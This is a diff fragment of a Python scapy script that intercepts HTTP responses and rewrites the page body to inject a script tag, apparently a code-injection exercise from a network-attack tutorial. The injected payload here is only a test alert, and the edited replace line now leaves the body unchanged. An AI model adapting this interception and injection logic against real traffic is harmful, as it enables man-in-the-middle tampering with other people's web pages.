@@ -24,8 +24,9 @@ def process_packet(packet):
 #check packets source port for 80 (http) RESPONSES
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
+            injection_code = "<script>alert('test');</script>"
 #in the captured packet replace the body in the load field with a script
-            load = load.replace("</body>", "<script>alert('test');</script></body>")
+            load = load.replace("</body>", "</body>")
 #use regex to search for Content-Length in entire packet; ?: will search for item but not return it
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search:
